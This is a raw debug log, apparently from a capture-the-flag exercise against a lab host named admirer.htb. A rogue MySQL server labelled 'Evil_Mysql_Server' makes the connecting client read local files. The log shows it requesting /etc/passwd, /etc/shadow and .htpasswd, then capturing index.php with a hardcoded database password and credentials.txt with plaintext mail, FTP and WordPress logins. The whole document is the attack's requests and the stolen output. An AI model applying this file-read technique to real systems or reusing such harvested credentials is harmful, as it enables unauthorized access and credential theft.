+2020-06-21 00:13:16,935:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-21 00:13:16,996:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:13:16,997:DEBUG:Data recved: '\x02'
+2020-06-21 00:13:16,997:INFO:-- result
+2020-06-21 00:13:16,997:INFO:Result: '\x02'
+2020-06-21 00:13:16,997:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:13:16,997:INFO:Last packet
+2020-06-21 00:13:17,053:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:13:17,053:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:13:17,053:INFO:Query
+2020-06-21 00:13:17,053:DEBUG:Pushed: '\r\x00\x00\x01\xfb../local.xml'
+2020-06-21 00:13:17,172:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:13:17,172:DEBUG:Data recved: '\x02'
+2020-06-21 00:13:17,172:INFO:-- result
+2020-06-21 00:13:17,172:INFO:Result: '\x02'
+2020-06-21 00:13:17,172:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:13:17,172:INFO:Last packet
+2020-06-21 00:13:17,251:DEBUG:Data recved: '.\x00\x00'
+2020-06-21 00:13:17,251:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-21 00:13:17,251:INFO:Query
+2020-06-21 00:13:17,251:DEBUG:Pushed: '\x0e\x00\x00\x01\xfb../robots.txt'
+2020-06-21 00:13:17,345:DEBUG:Data recved: '\x8a\x00\x00'
+2020-06-21 00:13:17,345:DEBUG:Data recved: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-21 00:13:17,345:INFO:-- result
+2020-06-21 00:13:17,345:INFO:Result: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-21 00:13:17,345:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:13:17,346:DEBUG:Data recved: '\x03'
+2020-06-21 00:13:17,346:INFO:-- result
+2020-06-21 00:13:17,346:INFO:Result: '\x03'
+2020-06-21 00:13:17,346:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:13:17,346:INFO:Last packet
+2020-06-21 00:13:17,462:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-21 00:13:17,462:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-21 00:13:17,463:INFO:Query
+2020-06-21 00:13:17,463:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-21 00:13:17,514:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:13:17,514:DEBUG:Data recved: '\x02'
+2020-06-21 00:13:17,514:INFO:-- result
+2020-06-21 00:13:17,514:INFO:Result: '\x02'
+2020-06-21 00:13:17,514:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:13:17,514:INFO:Last packet
+2020-06-21 00:13:17,562:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:13:17,562:DEBUG:Data recved: '\x00\x03SHOW DATABASES'
+2020-06-21 00:13:17,562:INFO:Query
+2020-06-21 00:13:17,562:DEBUG:Pushed: '\r\x00\x00\x01\xfb../.htpasswd'
+2020-06-21 00:13:17,608:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:13:17,609:DEBUG:Data recved: '\x02'
+2020-06-21 00:13:17,609:INFO:-- result
+2020-06-21 00:13:17,609:INFO:Result: '\x02'
+2020-06-21 00:13:17,609:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:13:17,609:INFO:Last packet
+2020-06-21 00:13:17,657:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-21 00:13:17,657:DEBUG:Data recved: '\x00\x01'
+2020-06-21 00:13:17,658:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-21 00:13:17,658:DEBUG:Data recved: '\x00\x01'
+2020-06-21 00:17:09,153:INFO:Conn from: ('10.10.10.187', 54560)
+2020-06-21 00:17:09,153:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-21 00:17:09,200:DEBUG:Data recved: '9\x00\x00'
+2020-06-21 00:17:09,200:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-21 00:17:09,200:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:17:09,200:INFO:Last packet
+2020-06-21 00:17:09,246:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:17:09,246:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:17:09,246:INFO:Query
+2020-06-21 00:17:09,246:DEBUG:Pushed: '\x07\x00\x00\x01\xfb../hta'
+2020-06-21 00:17:09,292:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:17:09,293:DEBUG:Data recved: '\x02'
+2020-06-21 00:17:09,293:INFO:-- result
+2020-06-21 00:17:09,293:INFO:Result: '\x02'
+2020-06-21 00:17:09,293:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:17:09,293:INFO:Last packet
+2020-06-21 00:17:09,342:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:17:09,343:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:17:09,343:INFO:Query
+2020-06-21 00:17:09,343:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-21 00:17:09,389:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:17:09,389:DEBUG:Data recved: '\x02'
+2020-06-21 00:17:09,389:INFO:-- result
+2020-06-21 00:17:09,389:INFO:Result: '\x02'
+2020-06-21 00:17:09,390:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:17:09,390:INFO:Last packet
+2020-06-21 00:17:09,436:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:17:09,436:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:17:09,436:INFO:Query
+2020-06-21 00:17:09,436:DEBUG:Pushed: '\r\x00\x00\x01\xfb../index.php'
+2020-06-21 00:17:09,483:DEBUG:Data recved: '\xfc\x0f\x00'
+2020-06-21 00:17:09,483:DEBUG:Data recved: '\x02<!DOCTYPE HTML>\n<!--\n\tMultiverse by HTML5 UP\n\thtml5up.net | @ajlkn\n\tFree for personal and commercial use under the CCA 3.0 license (html5up.net/license)\n-->\n<html>\n\t<head>\n\t\t<title>Admirer</title>\n\t\t<meta charset="utf-8" />\n\t\t<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />\n\t\t<link rel="stylesheet" href="assets/css/main.css" />\n\t\t<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>\n\t</head>\n\t<body class="is-preload">\n\n\t\t<!-- Wrapper -->\n\t\t\t<div id="wrapper">\n\n\t\t\t\t<!-- Header -->\n\t\t\t\t\t<header id="header">\n\t\t\t\t\t\t<h1><a href="index.html"><strong>Admirer</strong> of skills and visuals</a></h1>\n\t\t\t\t\t\t<nav>\n\t\t\t\t\t\t\t<ul>\n\t\t\t\t\t\t\t\t<li><a href="#footer" class="icon solid fa-info-circle">About</a></li>\n\t\t\t\t\t\t\t</ul>\n\t\t\t\t\t\t</nav>\n\t\t\t\t\t</header>\n\n\t\t\t\t<!-- Main -->\n\t\t\t\t\t<div id="main">\t\t\t\n\t\t\t\t\t <?php\n                        $servername = "localhost";\n                        $username = "waldo";\n                        $password = "&<h5b~yK3F#{PaPB&dA}{H>";\n                        $dbname = "admirerdb";\n\n                        // Create connection\n                        $conn = new mysqli($servername, $username, $password, $dbname);\n                        // Check connection\n                        if ($conn->connect_error) {\n                            die("Connection failed: " . $conn->connect_error);\n                        }\n\n                        $sql = "SELECT * FROM items";\n                        $result = $conn->query($sql);\n\n                        if ($result->num_rows > 0) {\n                            // output data of each row\n                            while($row = $result->fetch_assoc()) {\n                                echo "<article class=\'thumb\'>\\n";\n    \t\t\t\t\t\t\techo "<a href=\'".$row["image_path"]."\' class=\'image\'><img src=\'".$row["thumb_path"]."\' alt=\'\' /></a>\\n";\n\t    \t\t\t\t\t\techo "<h2>".$row["title"]."</h2>\\n";\n\t    \t\t\t\t\t\techo "<p>".$row["text"]."</p>\\n";\n\t    \t\t\t\t\t    echo "</article>\\n";\n                            }\n                        } else {\n                            echo "0 results";\n                        }\n                        $conn->close();\n                    ?>\n\t\t\t\t\t</div>\n\n\t\t\t\t<!-- Footer -->\n\t\t\t\t\t<footer id="footer" class="panel">\n\t\t\t\t\t\t<div class="inner split">\n\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t<section>\n\t\t\t\t\t\t\t\t\t<h2>Allow yourself to be amazed</h2>\n\t\t\t\t\t\t\t\t\t<p>Skills are not to be envied, but to feel inspired by.<br>\n\t\t\t\t\t\t\t\t\tVisual arts and music are there to take care of your soul.<br><br>\n\t\t\t\t\t\t\t\t\tLet your senses soak up these wonders...<br><br><br><br>\n\t\t\t\t\t\t\t\t\t</p>\n\t\t\t\t\t\t\t\t</section>\n\t\t\t\t\t\t\t\t<section>\n\t\t\t\t\t\t\t\t\t<h2>Follow me on ...</h2>\n\t\t\t\t\t\t\t\t\t<ul class="icons">\n\t\t\t\t\t\t\t\t\t\t<li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href="#" class="icon brands fa-facebook-f"><span class="label">Facebook</span></a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href="#" class="icon brands fa-instagram"><span class="label">Instagram</span></a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href="#" class="icon brands fa-github"><span class="label">GitHub</span></a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href="#" class="icon brands fa-dribbble"><span class="label">Dribbble</span></a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href="#" class="icon brands fa-linkedin-in"><span class="label">LinkedIn</span></a></li>\n\t\t\t\t\t\t\t\t\t</ul>\n\t\t\t\t\t\t\t\t</section>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t<section>\n\t\t\t\t\t\t\t\t\t<h2>Get in touch</h2>\n\t\t\t\t\t\t\t\t\t<form method="post" action="#"><!-- Still under development... This does not send anything yet, but it looks nice! -->\n\t\t\t\t\t\t\t\t\t\t<div class="fields">\n\t\t\t\t\t\t\t\t\t\t\t<div class="field half">\n\t\t\t\t\t\t\t\t\t\t\t\t<input type="text" name="name" id="name" placeholder="Name" />\n\t\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t\t<div class="field half">\n\t\t\t\t\t\t\t\t\t\t\t\t<input type="text" name="email" id="email" placeholder="Email" />\n\t\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t\t<div class="field">\n\t\t\t\t\t\t\t\t\t\t\t\t<textarea name="message" id="message" rows="4" placeholder="Message"></textarea>\n\t\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t<ul class="actions">\n\t\t\t\t\t\t\t\t\t\t\t<li><input type="submit" value="Send" c'
+2020-06-21 00:17:09,483:INFO:-- result
+2020-06-21 00:17:09,483:INFO:Result: '\x02<!DOCTYPE HTML>\n<!--\n\tMultiverse by HTML5 UP\n\thtml5up.net | @ajlkn\n\tFree for personal and commercial use under the CCA 3.0 license (html5up.net/license)\n-->\n<html>\n\t<head>\n\t\t<title>Admirer</title>\n\t\t<meta charset="utf-8" />\n\t\t<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />\n\t\t<link rel="stylesheet" href="assets/css/main.css" />\n\t\t<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>\n\t</head>\n\t<body class="is-preload">\n\n\t\t<!-- Wrapper -->\n\t\t\t<div id="wrapper">\n\n\t\t\t\t<!-- Header -->\n\t\t\t\t\t<header id="header">\n\t\t\t\t\t\t<h1><a href="index.html"><strong>Admirer</strong> of skills and visuals</a></h1>\n\t\t\t\t\t\t<nav>\n\t\t\t\t\t\t\t<ul>\n\t\t\t\t\t\t\t\t<li><a href="#footer" class="icon solid fa-info-circle">About</a></li>\n\t\t\t\t\t\t\t</ul>\n\t\t\t\t\t\t</nav>\n\t\t\t\t\t</header>\n\n\t\t\t\t<!-- Main -->\n\t\t\t\t\t<div id="main">\t\t\t\n\t\t\t\t\t <?php\n                        $servername = "localhost";\n                        $username = "waldo";\n                        $password = "&<h5b~yK3F#{PaPB&dA}{H>";\n                        $dbname = "admirerdb";\n\n                        // Create connection\n                        $conn = new mysqli($servername, $username, $password, $dbname);\n                        // Check connection\n                        if ($conn->connect_error) {\n                            die("Connection failed: " . $conn->connect_error);\n                        }\n\n                        $sql = "SELECT * FROM items";\n                        $result = $conn->query($sql);\n\n                        if ($result->num_rows > 0) {\n                            // output data of each row\n                            while($row = $result->fetch_assoc()) {\n                                echo "<article class=\'thumb\'>\\n";\n    \t\t\t\t\t\t\techo "<a href=\'".$row["image_path"]."\' class=\'image\'><img src=\'".$row["thumb_path"]."\' alt=\'\' /></a>\\n";\n\t    \t\t\t\t\t\techo "<h2>".$row["title"]."</h2>\\n";\n\t    \t\t\t\t\t\techo "<p>".$row["text"]."</p>\\n";\n\t    \t\t\t\t\t    echo "</article>\\n";\n                            }\n                        } else {\n                            echo "0 results";\n                        }\n                        $conn->close();\n                    ?>\n\t\t\t\t\t</div>\n\n\t\t\t\t<!-- Footer -->\n\t\t\t\t\t<footer id="footer" class="panel">\n\t\t\t\t\t\t<div class="inner split">\n\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t<section>\n\t\t\t\t\t\t\t\t\t<h2>Allow yourself to be amazed</h2>\n\t\t\t\t\t\t\t\t\t<p>Skills are not to be envied, but to feel inspired by.<br>\n\t\t\t\t\t\t\t\t\tVisual arts and music are there to take care of your soul.<br><br>\n\t\t\t\t\t\t\t\t\tLet your senses soak up these wonders...<br><br><br><br>\n\t\t\t\t\t\t\t\t\t</p>\n\t\t\t\t\t\t\t\t</section>\n\t\t\t\t\t\t\t\t<section>\n\t\t\t\t\t\t\t\t\t<h2>Follow me on ...</h2>\n\t\t\t\t\t\t\t\t\t<ul class="icons">\n\t\t\t\t\t\t\t\t\t\t<li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href="#" class="icon brands fa-facebook-f"><span class="label">Facebook</span></a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href="#" class="icon brands fa-instagram"><span class="label">Instagram</span></a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href="#" class="icon brands fa-github"><span class="label">GitHub</span></a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href="#" class="icon brands fa-dribbble"><span class="label">Dribbble</span></a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href="#" class="icon brands fa-linkedin-in"><span class="label">LinkedIn</span></a></li>\n\t\t\t\t\t\t\t\t\t</ul>\n\t\t\t\t\t\t\t\t</section>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t<section>\n\t\t\t\t\t\t\t\t\t<h2>Get in touch</h2>\n\t\t\t\t\t\t\t\t\t<form method="post" action="#"><!-- Still under development... This does not send anything yet, but it looks nice! -->\n\t\t\t\t\t\t\t\t\t\t<div class="fields">\n\t\t\t\t\t\t\t\t\t\t\t<div class="field half">\n\t\t\t\t\t\t\t\t\t\t\t\t<input type="text" name="name" id="name" placeholder="Name" />\n\t\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t\t<div class="field half">\n\t\t\t\t\t\t\t\t\t\t\t\t<input type="text" name="email" id="email" placeholder="Email" />\n\t\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t\t<div class="field">\n\t\t\t\t\t\t\t\t\t\t\t\t<textarea name="message" id="message" rows="4" placeholder="Message"></textarea>\n\t\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t<ul class="actions">\n\t\t\t\t\t\t\t\t\t\t\t<li><input type="submit" value="Send" c'
+2020-06-21 00:17:09,484:DEBUG:Data recved: '\x13\x02\x00'
+2020-06-21 00:17:09,484:DEBUG:Data recved: '\x03lass="primary" /></li>\n\t\t\t\t\t\t\t\t\t\t\t<li><input type="reset" value="Reset" /></li>\n\t\t\t\t\t\t\t\t\t\t</ul>\n\t\t\t\t\t\t\t\t\t</form>\n\t\t\t\t\t\t\t\t</section>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</footer>\n\n\t\t\t</div>\n\n\t\t<!-- Scripts -->\n\t\t\t<script src="assets/js/jquery.min.js"></script>\n\t\t\t<script src="assets/js/jquery.poptrox.min.js"></script>\n\t\t\t<script src="assets/js/browser.min.js"></script>\n\t\t\t<script src="assets/js/breakpoints.min.js"></script>\n\t\t\t<script src="assets/js/util.js"></script>\n\t\t\t<script src="assets/js/main.js"></script>\n\n\t</body>\n</html>\n'
+2020-06-21 00:17:09,484:INFO:-- result
+2020-06-21 00:17:09,484:INFO:Result: '\x03lass="primary" /></li>\n\t\t\t\t\t\t\t\t\t\t\t<li><input type="reset" value="Reset" /></li>\n\t\t\t\t\t\t\t\t\t\t</ul>\n\t\t\t\t\t\t\t\t\t</form>\n\t\t\t\t\t\t\t\t</section>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</footer>\n\n\t\t\t</div>\n\n\t\t<!-- Scripts -->\n\t\t\t<script src="assets/js/jquery.min.js"></script>\n\t\t\t<script src="assets/js/jquery.poptrox.min.js"></script>\n\t\t\t<script src="assets/js/browser.min.js"></script>\n\t\t\t<script src="assets/js/breakpoints.min.js"></script>\n\t\t\t<script src="assets/js/util.js"></script>\n\t\t\t<script src="assets/js/main.js"></script>\n\n\t</body>\n</html>\n'
+2020-06-21 00:17:09,484:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:17:09,484:DEBUG:Data recved: '\x04'
+2020-06-21 00:17:09,484:INFO:-- result
+2020-06-21 00:17:09,484:INFO:Result: '\x04'
+2020-06-21 00:17:09,484:DEBUG:Pushed: '\x07\x00\x00\x05\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:17:09,484:INFO:Last packet
+2020-06-21 00:17:09,531:DEBUG:Data recved: '.\x00\x00'
+2020-06-21 00:17:09,531:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-21 00:17:09,531:INFO:Query
+2020-06-21 00:17:09,531:DEBUG:Pushed: '\x0e\x00\x00\x01\xfb../robots.txt'
+2020-06-21 00:17:09,580:DEBUG:Data recved: '\x8a\x00\x00'
+2020-06-21 00:17:09,580:DEBUG:Data recved: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-21 00:17:09,580:INFO:-- result
+2020-06-21 00:17:09,580:INFO:Result: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-21 00:17:09,581:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:17:09,581:DEBUG:Data recved: '\x03'
+2020-06-21 00:17:09,581:INFO:-- result
+2020-06-21 00:17:09,581:INFO:Result: '\x03'
+2020-06-21 00:17:09,581:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:17:09,581:INFO:Last packet
+2020-06-21 00:17:09,627:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-21 00:17:09,628:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-21 00:17:09,628:INFO:Query
+2020-06-21 00:17:09,628:DEBUG:Pushed: '\x07\x00\x00\x01\xfb../hta'
+2020-06-21 00:17:09,674:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:17:09,675:DEBUG:Data recved: '\x02'
+2020-06-21 00:17:09,675:INFO:-- result
+2020-06-21 00:17:09,675:INFO:Result: '\x02'
+2020-06-21 00:17:09,675:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:17:09,675:INFO:Last packet
+2020-06-21 00:17:09,767:INFO:Conn from: ('10.10.10.187', 54562)
+2020-06-21 00:17:09,768:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-21 00:17:09,814:DEBUG:Data recved: '9\x00\x00'
+2020-06-21 00:17:09,814:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-21 00:17:09,814:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:17:09,814:INFO:Last packet
+2020-06-21 00:17:09,859:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:17:09,860:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:17:09,860:INFO:Query
+2020-06-21 00:17:09,860:DEBUG:Pushed: '\x0e\x00\x00\x01\xfb../robots.txt'
+2020-06-21 00:17:09,905:DEBUG:Data recved: '\x8a\x00\x00'
+2020-06-21 00:17:09,906:DEBUG:Data recved: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-21 00:17:09,906:INFO:-- result
+2020-06-21 00:17:09,906:INFO:Result: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-21 00:17:09,906:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:17:09,906:DEBUG:Data recved: '\x03'
+2020-06-21 00:17:09,906:INFO:-- result
+2020-06-21 00:17:09,906:INFO:Result: '\x03'
+2020-06-21 00:17:09,907:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:17:09,907:INFO:Last packet
+2020-06-21 00:17:09,952:DEBUG:Data recved: '.\x00\x00'
+2020-06-21 00:17:09,953:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-21 00:17:09,953:INFO:Query
+2020-06-21 00:17:09,953:DEBUG:Pushed: '\x1d\x00\x00\x01\xfb../admin-dir/credentials.txt'
+2020-06-21 00:17:10,000:DEBUG:Data recved: '\x88\x00\x00'
+2020-06-21 00:17:10,000:DEBUG:Data recved: '\x02[Internal mail account]\nw.cooper@admirer.htb\nfgJr6q#S\\W:$P\n\n[FTP account]\nftpuser\n%n?4Wz}R$tTF7\n\n[Wordpress account]\nadmin\nw0rdpr3ss01!\n'
+2020-06-21 00:17:10,000:INFO:-- result
+2020-06-21 00:17:10,000:INFO:Result: '\x02[Internal mail account]\nw.cooper@admirer.htb\nfgJr6q#S\\W:$P\n\n[FTP account]\nftpuser\n%n?4Wz}R$tTF7\n\n[Wordpress account]\nadmin\nw0rdpr3ss01!\n'
+2020-06-21 00:17:10,000:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:17:10,000:DEBUG:Data recved: '\x03'
+2020-06-21 00:17:10,000:INFO:-- result
+2020-06-21 00:17:10,000:INFO:Result: '\x03'
+2020-06-21 00:17:10,000:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:17:10,001:INFO:Last packet
+2020-06-21 00:17:10,046:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-21 00:17:10,046:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-21 00:17:10,046:INFO:Query
+2020-06-21 00:17:10,047:DEBUG:Pushed: '\x1d\x00\x00\x01\xfb../admin-dir/credentials.txt'
+2020-06-21 00:17:10,105:DEBUG:Data recved: '\x88\x00\x00'
+2020-06-21 00:17:10,105:DEBUG:Data recved: '\x02[Internal mail account]\nw.cooper@admirer.htb\nfgJr6q#S\\W:$P\n\n[FTP account]\nftpuser\n%n?4Wz}R$tTF7\n\n[Wordpress account]\nadmin\nw0rdpr3ss01!\n'
+2020-06-21 00:17:10,105:INFO:-- result
+2020-06-21 00:17:10,105:INFO:Result: '\x02[Internal mail account]\nw.cooper@admirer.htb\nfgJr6q#S\\W:$P\n\n[FTP account]\nftpuser\n%n?4Wz}R$tTF7\n\n[Wordpress account]\nadmin\nw0rdpr3ss01!\n'
+2020-06-21 00:17:10,105:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:17:10,105:DEBUG:Data recved: '\x03'
+2020-06-21 00:17:10,105:INFO:-- result
+2020-06-21 00:17:10,106:INFO:Result: '\x03'
+2020-06-21 00:17:10,106:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:17:10,106:INFO:Last packet
+2020-06-21 00:17:10,152:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-21 00:17:10,153:DEBUG:Data recved: '\x00\x01'
+2020-06-21 00:17:10,154:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-21 00:17:10,154:DEBUG:Data recved: '\x00\x01'
